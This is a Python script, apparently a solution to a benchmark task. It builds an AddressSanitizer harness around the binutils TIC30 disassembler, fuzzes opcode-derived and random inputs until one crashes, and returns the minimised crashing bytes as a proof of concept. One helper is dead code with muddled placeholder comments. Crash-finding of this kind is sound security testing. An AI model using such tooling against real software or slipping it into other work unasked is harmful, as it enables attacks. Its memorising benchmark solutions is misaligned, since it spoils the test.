import os
import re
import tarfile
import tempfile
import subprocess
import struct
import random
from typing import List, Tuple, Optional, Set


def _is_tarfile(path: str) -> bool:
    try:
        return tarfile.is_tarfile(path)
    except Exception:
        return False


def _safe_extract_tar(tar: tarfile.TarFile, path: str) -> None:
    base = os.path.realpath(path)
    for m in tar.getmembers():
        dest = os.path.realpath(os.path.join(path, m.name))
        if not (dest == base or dest.startswith(base + os.sep)):
            continue
        tar.extract(m, path=path)


def _prepare_src_root(src_path: str) -> str:
    if os.path.isdir(src_path):
        return src_path
    if not _is_tarfile(src_path):
        return src_path
    out = tempfile.mkdtemp(prefix="poc_src_")
    with tarfile.open(src_path, "r:*") as tf:
        _safe_extract_tar(tf, out)
    entries = [os.path.join(out, e) for e in os.listdir(out)]
    dirs = [e for e in entries if os.path.isdir(e)]
    if len(dirs) == 1:
        return dirs[0]
    return out


def _find_files(root: str, names: Set[str]) -> dict:
    found = {}
    for dirpath, _, filenames in os.walk(root):
        for fn in filenames:
            if fn in names and fn not in found:
                found[fn] = os.path.join(dirpath, fn)
        if len(found) == len(names):
            break
    return found


def _find_first(root: str, filename: str) -> Optional[str]:
    for dirpath, _, filenames in os.walk(root):
        for fn in filenames:
            if fn == filename:
                return os.path.join(dirpath, fn)
    return None


def _find_include_dir(root: str) -> Optional[str]:
    # Prefer include directory containing dis-asm.h
    p = _find_first(root, "dis-asm.h")
    if not p:
        return None
    return os.path.dirname(p)


def _extract_instruction_byte_len(dis_text: str) -> int:
    # Try to infer the first instruction fetch size
    # Common patterns: read_memory_func(..., buffer, 4, info) or buffer[4]
    m = re.search(r'read_memory_func\s*\([^;]*?,\s*[^,]*?,\s*(\d+)\s*,\s*info\s*\)', dis_text, flags=re.S)
    if m:
        try:
            n = int(m.group(1))
            if 1 <= n <= 16:
                return n
        except Exception:
            pass
    m2 = re.search(r'\bbfd_byte\s+buffer\s*\[\s*(\d+)\s*\]\s*;', dis_text)
    if m2:
        try:
            n = int(m2.group(1))
            if 1 <= n <= 16:
                return n
        except Exception:
            pass
    return 4


def _brace_block(text: str, start_brace_idx: int) -> Optional[str]:
    if start_brace_idx < 0 or start_brace_idx >= len(text) or text[start_brace_idx] != "{":
        return None
    depth = 0
    i = start_brace_idx
    in_str = False
    esc = False
    while i < len(text):
        c = text[i]
        if in_str:
            if esc:
                esc = False
            elif c == "\\":
                esc = True
            elif c == '"':
                in_str = False
        else:
            if c == '"':
                in_str = True
            elif c == "{":
                depth += 1
            elif c == "}":
                depth -= 1
                if depth == 0:
                    return text[start_brace_idx:i + 1]
        i += 1
    return None


def _parse_tic30_opcodes_pairs(opc_text: str) -> List[Tuple[int, int]]:
    # Extract initializer body for tic30_opcodes
    m = re.search(r'\btic30_opcodes\b[^{=]*=\s*{', opc_text)
    if not m:
        m = re.search(r'\btic30_opcodes\b[^{]*{', opc_text)
    if not m:
        return []
    brace_start = opc_text.find("{", m.start())
    blk = _brace_block(opc_text, brace_start)
    if not blk:
        return []

    # Entries likely: { "mn", 0xOPC, 0xMASK, ... }
    # Collect first two numeric fields after the mnemonic string.
    pat = re.compile(r'\{\s*"[^"]*"\s*,\s*(0x[0-9a-fA-F]+|\d+)\s*,\s*(0x[0-9a-fA-F]+|\d+)', flags=re.S)
    pairs: List[Tuple[int, int]] = []
    for mm in pat.finditer(blk):
        a_s, b_s = mm.group(1), mm.group(2)
        try:
            a = int(a_s, 0)
            b = int(b_s, 0)
            pairs.append((a, b))
        except Exception:
            continue
    return pairs


def _parse_direct_mask_value_calls(dis_text: str) -> List[Tuple[int, int]]:
    # If there are direct if conditions near print_branch
    # Try to find patterns: if ((insn & MASK) == VALUE) ... print_branch(
    out: List[Tuple[int, int]] = []
    pat = re.compile(
        r'if\s*\(\s*\(\s*([A-Za-z_]\w*)\s*&\s*(0x[0-9a-fA-F]+|\d+)\s*\)\s*==\s*(0x[0-9a-fA-F]+|\d+)\s*\)\s*{[^{}]*?print_branch\s*\(',
        flags=re.S
    )
    for m in pat.finditer(dis_text):
        try:
            mask = int(m.group(2), 0)
            val = int(m.group(3), 0)
            out.append((val, mask))
        except Exception:
            continue
    return out


def _which_cc() -> Optional[str]:
    for cc in ("clang", "gcc", "cc"):
        try:
            r = subprocess.run([cc, "--version"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=2)
            if r.returncode == 0:
                return cc
        except Exception:
            continue
    return None


_HARNESS_C = r'''
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <stdarg.h>
#include <stdio.h>
#include "dis-asm.h"

extern int print_insn_tic30 (bfd_vma, disassemble_info*);

static const uint8_t *g_buf = NULL;
static size_t g_len = 0;

static int buf_read_memory (bfd_vma memaddr, bfd_byte *myaddr, unsigned int length, struct disassemble_info *info) {
  (void)info;
  uint64_t a = (uint64_t) memaddr;
  uint64_t l = (uint64_t) length;
  if (a + l > (uint64_t) g_len) return 1;
  memcpy(myaddr, g_buf + (size_t)a, (size_t)length);
  return 0;
}

static void buf_memory_error (int status, bfd_vma memaddr, struct disassemble_info *info) {
  (void)status; (void)memaddr; (void)info;
}

static int sink_fprintf (void *stream, const char *fmt, ...) {
  (void)stream; (void)fmt;
  return 0;
}

static void sink_print_address (bfd_vma addr, struct disassemble_info *info) {
  (void)addr; (void)info;
}

static void setup_info(disassemble_info *info, int big_endian) {
  memset(info, 0, sizeof(*info));
  info->read_memory_func = buf_read_memory;
  info->memory_error_func = buf_memory_error;
  info->fprintf_func = sink_fprintf;
  info->print_address_func = sink_print_address;
  info->stream = NULL;
  info->buffer_vma = 0;
  info->buffer_length = (bfd_size_type) g_len;
  info->endian = big_endian ? BFD_ENDIAN_BIG : BFD_ENDIAN_LITTLE;
  info->endian_code = info->endian;
}

static void run_disasm(int first_only, int big_endian) {
  disassemble_info info;
  setup_info(&info, big_endian);

  if (first_only) {
    (void) print_insn_tic30((bfd_vma)0, &info);
    return;
  }

  bfd_vma pc = 0;
  int steps = 0;
  while ((size_t)pc < g_len && steps++ < 1024) {
    int l = print_insn_tic30(pc, &info);
    if (l <= 0) l = 1;
    pc += (bfd_vma) l;
  }
}

static int read_exact(FILE *f, uint8_t *dst, size_t n) {
  size_t got = 0;
  while (got < n) {
    size_t r = fread(dst + got, 1, n - got, f);
    if (r == 0) return 0;
    got += r;
  }
  return 1;
}

int main(int argc, char **argv) {
  int big_endian = 1;
  int first_only = 0;
  int loop_mode = 0;

  for (int i = 1; i < argc; i++) {
    if (strcmp(argv[i], "big") == 0) big_endian = 1;
    else if (strcmp(argv[i], "little") == 0) big_endian = 0;
    else if (strcmp(argv[i], "--first") == 0) first_only = 1;
    else if (strcmp(argv[i], "--loop") == 0) loop_mode = 1;
  }

  setvbuf(stdout, NULL, _IONBF, 0);

  if (!loop_mode) {
    uint8_t *buf = NULL;
    size_t cap = 0, len = 0;
    for (;;) {
      if (len + 4096 > cap) {
        size_t ncap = cap ? cap * 2 : 8192;
        while (ncap < len + 4096) ncap *= 2;
        uint8_t *nb = (uint8_t*)realloc(buf, ncap);
        if (!nb) return 0;
        buf = nb; cap = ncap;
      }
      size_t r = fread(buf + len, 1, 4096, stdin);
      len += r;
      if (r == 0) break;
    }
    g_buf = buf; g_len = len;
    run_disasm(first_only, big_endian);
    free(buf);
    return 0;
  }

  for (;;) {
    uint8_t le[4];
    if (!read_exact(stdin, le, 4)) return 0;
    uint32_t n = (uint32_t)le[0] | ((uint32_t)le[1] << 8) | ((uint32_t)le[2] << 16) | ((uint32_t)le[3] << 24);
    uint8_t *buf = (uint8_t*)malloc((size_t)n);
    if (!buf) return 0;
    if (!read_exact(stdin, buf, (size_t)n)) { free(buf); return 0; }
    g_buf = buf; g_len = (size_t)n;
    run_disasm(first_only, big_endian);
    free(buf);
    fputc(0, stdout);
  }
}
'''


def _build_harness(src_root: str, dis_c: str, opc_c: Optional[str]) -> Optional[str]:
    cc = _which_cc()
    if not cc:
        return None
    include_dir = _find_include_dir(src_root)
    if not include_dir:
        return None

    build_dir = tempfile.mkdtemp(prefix="poc_build_")
    harness_c = os.path.join(build_dir, "harness.c")
    exe = os.path.join(build_dir, "harness")
    with open(harness_c, "w", encoding="utf-8") as f:
        f.write(_HARNESS_C)

    cmd = [
        cc,
        "-O1",
        "-g",
        "-std=gnu99",
        "-D_GNU_SOURCE",
        "-fno-omit-frame-pointer",
        "-fsanitize=address",
        "-I", include_dir,
        harness_c,
        dis_c,
    ]
    if opc_c:
        cmd.append(opc_c)
    cmd += ["-o", exe]

    try:
        r = subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=120)
        if r.returncode != 0:
            # Retry without ASan in case toolchain lacks it (lower confidence)
            cmd2 = [
                cc,
                "-O1",
                "-g",
                "-std=gnu99",
                "-D_GNU_SOURCE",
                "-I", include_dir,
                harness_c,
                dis_c,
            ]
            if opc_c:
                cmd2.append(opc_c)
            cmd2 += ["-o", exe]
            r2 = subprocess.run(cmd2, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=120)
            if r2.returncode != 0:
                return None
        return exe
    except Exception:
        return None


def _pack_word(word: int, nbytes: int, endian: str) -> bytes:
    mask = (1 << (8 * nbytes)) - 1
    w = word & mask
    if nbytes == 4:
        return struct.pack(">I" if endian == "big" else "<I", w)
    if nbytes == 2:
        return struct.pack(">H" if endian == "big" else "<H", w)
    if nbytes == 1:
        return bytes([w & 0xFF])
    # generic
    b = []
    for i in range(nbytes):
        shift = (nbytes - 1 - i) * 8 if endian == "big" else i * 8
        b.append((w >> shift) & 0xFF)
    return bytes(b)


def _proc_send_case(proc: subprocess.Popen, data: bytes) -> bool:
    # Returns True if ack received (no crash), False if process died
    try:
        proc.stdin.write(struct.pack("<I", len(data)))
        proc.stdin.write(data)
        proc.stdin.flush()
    except Exception:
        return False
    try:
        ack = proc.stdout.read(1)
        return bool(ack)
    except Exception:
        return False


def _find_crash_with_loop(harness_exe: str, endian: str, candidates: List[bytes], first_only: bool = True) -> Optional[bytes]:
    args = [harness_exe, endian, "--loop"]
    if first_only:
        args.append("--first")
    try:
        proc = subprocess.Popen(args, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
    except Exception:
        return None
    try:
        for data in candidates:
            ok = _proc_send_case(proc, data)
            if not ok:
                try:
                    proc.kill()
                except Exception:
                    pass
                return data
        try:
            proc.kill()
        except Exception:
            pass
        return None
    finally:
        try:
            if proc.stdin:
                proc.stdin.close()
        except Exception:
            pass
        try:
            if proc.stdout:
                proc.stdout.close()
        except Exception:
            pass


def _crashes_one(harness_exe: str, endian: str, data: bytes, first_only: bool = True) -> bool:
    args = [harness_exe, endian]
    if first_only:
        args.append("--first")
    try:
        r = subprocess.run(args, input=data, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=2)
        return r.returncode != 0
    except Exception:
        return False


def _minimize_suffix(harness_exe: str, endian: str, data: bytes, min_len: int = 1) -> bytes:
    best = data
    while len(best) > min_len:
        cand = best[:-1]
        if _crashes_one(harness_exe, endian, cand, first_only=True):
            best = cand
        else:
            break
    return best


def _generate_candidates_from_pairs(pairs: List[Tuple[int, int]], instr_len: int, total_len: int) -> List[bytes]:
    allones = (1 << (8 * instr_len)) - 1
    insn_values: List[int] = []
    seen: Set[int] = set()

    def add_insn(x: int):
        x &= allones
        if x not in seen:
            seen.add(x)
            insn_values.append(x)

    for a, b in pairs:
        # assume a=opcode, b=mask
        add_insn(a)
        add_insn(a | (~b & allones))
        # assume swapped
        add_insn(b)
        add_insn(b | (~a & allones))

    # Add common extremal values
    add_insn(allones)
    add_insn(0)
    add_insn(allones >> 1)
    add_insn((1 << (8 * instr_len - 1)) - 1 if instr_len > 1 else 0x7F)

    # Limit to avoid too many
    insn_values = insn_values[:4000]

    candidates: List[bytes] = []
    pads = [b"\x00", b"\xff"]
    for insn in insn_values:
        for pad_byte in pads:
            base = insn  # packed later per endian in caller
            # placeholder: store as integer in 4-byte little-endian for now then repack in caller? no.
            # We'll store just raw first word little-endian for now and let caller repack? not.
            # Here, create candidates with first word set to bytes of insn in a fixed internal endian marker.
            # We'll return special marker (instr bytes set to allones) not possible.
            # Instead, return raw bytes with first word in both endian later.
            pass
    return []  # not used


def _generate_candidate_buffers_from_insns(insns: List[int], instr_len: int, total_len: int, endian: str) -> List[bytes]:
    out: List[bytes] = []
    seen: Set[bytes] = set()
    for insn in insns:
        first = _pack_word(insn, instr_len, endian)
        for pad in (b"\x00", b"\xff"):
            buf = first + pad * max(0, total_len - instr_len)
            if buf not in seen:
                seen.add(buf)
                out.append(buf)
    return out


def _collect_insns_from_opc(opc_text: str, instr_len: int) -> List[int]:
    pairs = _parse_tic30_opcodes_pairs(opc_text)
    if not pairs:
        return []
    allones = (1 << (8 * instr_len)) - 1
    insns: List[int] = []
    seen: Set[int] = set()

    def add(x: int):
        x &= allones
        if x not in seen:
            seen.add(x)
            insns.append(x)

    for a, b in pairs:
        add(a)
        add(a | (~b & allones))
        add(b)
        add(b | (~a & allones))

    # Additional direct mask/value from disassembler if any (treated as opcode/mask)
    return insns


def _collect_insns_from_dis(dis_text: str, instr_len: int) -> List[int]:
    mv = _parse_direct_mask_value_calls(dis_text)  # (val, mask)
    allones = (1 << (8 * instr_len)) - 1
    insns: List[int] = []
    seen: Set[int] = set()

    def add(x: int):
        x &= allones
        if x not in seen:
            seen.add(x)
            insns.append(x)

    for val, mask in mv:
        add(val)
        add(val | (~mask & allones))
    return insns


def _fuzz_random(harness_exe: str, endian: str, instr_len: int, total_len: int, iters: int = 20000) -> Optional[bytes]:
    args = [harness_exe, endian, "--loop", "--first"]
    try:
        proc = subprocess.Popen(args, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
    except Exception:
        return None

    rng = random.Random(0xC30D15)
    try:
        for _ in range(iters):
            # Bias: random first word plus high-entropy padding (often triggers "corrupt binaries" paths)
            first = bytes(rng.getrandbits(8) for _ in range(instr_len))
            pad = bytes(rng.getrandbits(8) for _ in range(max(0, total_len - instr_len)))
            data = first + pad
            ok = _proc_send_case(proc, data)
            if not ok:
                try:
                    proc.kill()
                except Exception:
                    pass
                return data
        try:
            proc.kill()
        except Exception:
            pass
        return None
    finally:
        try:
            if proc.stdin:
                proc.stdin.close()
        except Exception:
            pass
        try:
            if proc.stdout:
                proc.stdout.close()
        except Exception:
            pass


class Solution:
    def solve(self, src_path: str) -> bytes:
        src_root = _prepare_src_root(src_path)
        files = _find_files(src_root, {"tic30-dis.c", "tic30-opc.c"})
        dis_c = files.get("tic30-dis.c")
        opc_c = files.get("tic30-opc.c")

        if not dis_c or not os.path.isfile(dis_c):
            return b"\xff" * 10

        try:
            with open(dis_c, "r", encoding="utf-8", errors="ignore") as f:
                dis_text = f.read()
        except Exception:
            return b"\xff" * 10

        instr_len = _extract_instruction_byte_len(dis_text)
        total_len = max(64, instr_len + 32)

        opc_text = ""
        if opc_c and os.path.isfile(opc_c):
            try:
                with open(opc_c, "r", encoding="utf-8", errors="ignore") as f:
                    opc_text = f.read()
            except Exception:
                opc_text = ""

        harness_exe = _build_harness(src_root, dis_c, opc_c if opc_text else None)
        if not harness_exe:
            # Heuristic fallback
            return b"\xff" * 10

        # Collect insns to try
        insns: List[int] = []
        insns.extend(_collect_insns_from_dis(dis_text, instr_len))
        if opc_text:
            insns.extend(_collect_insns_from_opc(opc_text, instr_len))

        # Dedup while keeping order, and cap
        seen_i: Set[int] = set()
        insns2: List[int] = []
        allones = (1 << (8 * instr_len)) - 1
        for x in insns:
            x &= allones
            if x not in seen_i:
                seen_i.add(x)
                insns2.append(x)
        # Add extremal values
        for x in (allones, 0, allones >> 1):
            if x not in seen_i:
                seen_i.add(x)
                insns2.append(x)
        insns2 = insns2[:5000]

        best_poc: Optional[bytes] = None

        for endian in ("big", "little"):
            candidates = _generate_candidate_buffers_from_insns(insns2, instr_len, total_len, endian)
            crash = _find_crash_with_loop(harness_exe, endian, candidates, first_only=True)
            if crash is None:
                crash = _fuzz_random(harness_exe, endian, instr_len, total_len, iters=20000)
            if crash is None:
                continue

            # Ensure it crashes in one-shot mode
            if not _crashes_one(harness_exe, endian, crash, first_only=True):
                continue

            minimized = _minimize_suffix(harness_exe, endian, crash, min_len=instr_len)
            # Further attempt: if still crashes, try trimming to 10 bytes if possible
            if len(minimized) > 10:
                # try quickly to see if 10 works by keeping prefix
                cand10 = minimized[:10]
                if len(cand10) >= instr_len and _crashes_one(harness_exe, endian, cand10, first_only=True):
                    minimized = _minimize_suffix(harness_exe, endian, cand10, min_len=instr_len)

            best_poc = minimized
            break

        if best_poc is None:
            return b"\xff" * 10

        return best_poc[:max(1, len(best_poc))]